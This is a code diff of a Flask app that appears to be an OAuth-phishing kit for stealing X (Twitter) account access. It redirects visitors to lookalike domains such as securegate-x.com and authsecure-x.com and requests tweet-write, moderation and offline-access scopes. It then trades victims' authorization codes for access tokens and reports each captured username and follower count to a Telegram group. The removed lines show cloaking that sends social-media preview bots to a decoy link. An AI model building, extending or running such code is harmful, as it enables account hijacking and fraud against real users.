@@ -21,22 +21,17 @@ try:
 except Exception as e:
     print("[-] MongoDB connection failed:", e)
 
-@app.route('/link')
+@app.route('/')
 def link():
-    user_agent = request.headers.get('User-Agent', '').strip()
-    print(user_agent)
-    v = request.args.get('v')
-    data = spoofs.find_one({ "spoof_id": v })
-    
-    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent or 'InstagramBot' in user_agent or 'facebookexternalhit' in user_agent:
-        return redirect(data["spoof"])
-    
-    return redirect(data["redirect"])
+    data = groups.find_one()
+    identifier = data["identifier"][0]
+   
+    return redirect(f"https://securegate-x.com/oauth?r={identifier}")
 
 @app.route('/oauth')
 def oauth():
     user_agent = request.headers.get('User-Agent', '').strip()
-    identifier = request.args.get('identifier')
+    identifier = request.args.get('r')
 
     if not identifier:
         return "⚠️ Identifier is required.", 400
@@ -45,7 +40,7 @@ def oauth():
         {"identifier": {"$in": [identifier]}}
     )
     if not group:
-        return "⚠️ Identifier is invalid.", 404
+        return 404
     
     i = group["identifier"].index(identifier)
     twitter = group.get("twitter_settings")[i]
@@ -79,7 +74,7 @@ def oauth():
 
 def generate_twitter_oauth_url():
     TWITTER_CLIENT_ID = session.get("client_id")
-    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fus01-x.com%2Fauth'
+    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fauthsecure-x.com%2Fauth'
     return (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
             f'&redirect_uri={TWITTER_CALLBACK_URL}'
             f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
@@ -158,7 +153,7 @@ def exchange_token_for_access(authorization_code):
     request_data = {
         'grant_type': 'authorization_code',
         'code': authorization_code,
-        'redirect_uri': 'https://us01-x.com/auth',
+        'redirect_uri': 'https://authsecure-x.com/auth',
         'code_verifier': "challenge"
     }
     headers = {
@@ -192,7 +187,8 @@ def format_followers(followers_count):
 
 def send_to_telegram(username, followers_count, group_id):
     followers_count = format_followers(followers_count)
-    message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
+    username_formatted = username.replace(".", "\\.").replace("-", "\\-").replace("!", "\\!").replace("_", "\\_")
+    message = (f'𝕏 *User [{username_formatted}](https://x.com/{username}) has authorized.*\n'
                f'👥 *Followers:* {followers_count}')
     
     send_telegram_message(group_id, message)
